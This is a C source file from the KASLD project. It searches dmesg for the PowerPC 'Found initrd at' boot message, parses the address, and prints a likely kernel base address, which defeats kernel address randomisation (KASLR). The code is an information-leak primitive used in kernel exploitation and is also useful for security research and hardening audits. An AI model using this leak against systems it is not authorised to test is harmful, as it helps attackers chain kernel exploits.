// This file is part of KASLD - https://github.com/bcoles/kasld
//
// check_for_initrd() prints initrd start address during boot:
// https://elixir.bootlin.com/linux/v6.1.1/source/arch/powerpc/kernel/setup-common.c#L385
//
// ppc64:
// [    0.000000] Found initrd at 0xc000000001a00000:0xc000000002a26000
//
// Requires:
// - CONFIG_BLK_DEV_INITRD=y
// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities.
//
// References:
// https://elixir.bootlin.com/linux/v6.1.1/source/arch/powerpc/kernel/setup-common.c#L385
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "kasld.h"
#include "include/syslog.h"
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

unsigned long get_kernel_addr_dmesg_check_for_initrd() {
  char *syslog;
  char *endptr;
  char *substr;
  char *line_buf;
  const char *needle = "Found initrd at 0x";
  int size;
  unsigned long addr = 0;

  printf("[.] searching dmesg for check_for_initrd() info ...\n");

  if (mmap_syslog(&syslog, &size))
    return 0;

  substr = strstr(syslog, needle);
  if (substr == NULL)
    return 0;

  line_buf = strtok(substr, "\n");
  if (line_buf == NULL)
    return 0;

  /* Found initrd at 0xc000000001a00000:0xc000000002a26000 */
  // printf("%s\n", line_buf);

  addr = strtoul(&line_buf[strlen(needle)], &endptr, 16);

  if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
    return addr;

  return 0;
}

int main(int argc, char **argv) {
  unsigned long addr = get_kernel_addr_dmesg_check_for_initrd();
  if (!addr)
    return 1;

  printf("leaked initrd start: %lx\n", addr);
  printf("possible kernel base: %lx\n", addr & -KERNEL_ALIGN);

  return 0;
}
